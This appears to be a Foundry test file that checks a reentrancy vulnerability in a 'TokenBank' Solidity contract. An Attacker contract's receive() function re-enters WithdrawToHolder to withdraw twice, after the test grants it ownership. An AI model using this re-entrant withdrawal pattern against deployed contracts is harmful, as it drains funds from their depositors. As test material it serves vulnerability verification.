
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();
        
        _attacker = new Attacker(address(_contractUnderTest));
        
        // The vulnerability requires the caller to be the owner to invoke WithdrawToHolder.
        // We transfer ownership to the attacker contract to facilitate the exploit scenario.
        _contractUnderTest.changeOwner(address(_attacker));
        _attacker.acceptOwnership();
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinDeposit is 1 ether. We need to deposit at least that.
        // To demonstrate reentrancy without triggering an underflow revert in Solidity 0.8.x,
        // we will deposit enough to cover multiple withdrawals.
        // We aim for 2 withdrawals of 'attackVal'.
        vm.assume(attackVal > 0.6 ether && attackVal < 100 ether);
        

        // --- 2. State Configuration (Pre-Condition) ---
        // Handled within setupAttack via Deposit.

        // --- 3. Funding ---
        // Fund the attacker with enough to deposit (2 * attackVal).
        uint256 depositAmount = attackVal * 2;
        vm.deal(address(_attacker), depositAmount);
        
        // Fund the victim to ensure it has liquidity (though it will have the deposit).
        vm.deal(address(_contractUnderTest), depositAmount + 10 ether); 
        
        // Fund the test contract to pass value to setupAttack.
        vm.deal(address(this), depositAmount);

        // --- 4. Trigger Attack ---
        // The attacker deposits 'depositAmount' and prepares to withdraw 'attackVal' recursively.
        _attacker.setupAttack{value: depositAmount}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    TokenBank public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public amountToWithdraw;

    constructor(address victimAddress) { 
        victim = TokenBank(payable(victimAddress));
    }

    function acceptOwnership() public {
        victim.confirmOwner();
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        amountToWithdraw = val;
        
        // Deposit funds to pass the Holders check.
        // We deposit 2x the withdrawal amount to allow one re-entrant call 
        // without triggering an arithmetic underflow in the victim's final state update.
        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        // Call the vulnerable function.
        victim.WithdrawToHolder(address(this), amountToWithdraw);

        // Verify that we successfully re-entered.
        if (attackCallCount >= 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        // We limit recursion to 1 extra call to demonstrate the vulnerability 
        // while keeping the math valid for the 0.8.x compiler.
        if (attackCallCount < 1) {            
            attackCallCount++;
            victim.WithdrawToHolder(address(this), amountToWithdraw);
        }
    }

    fallback() external payable {}
}
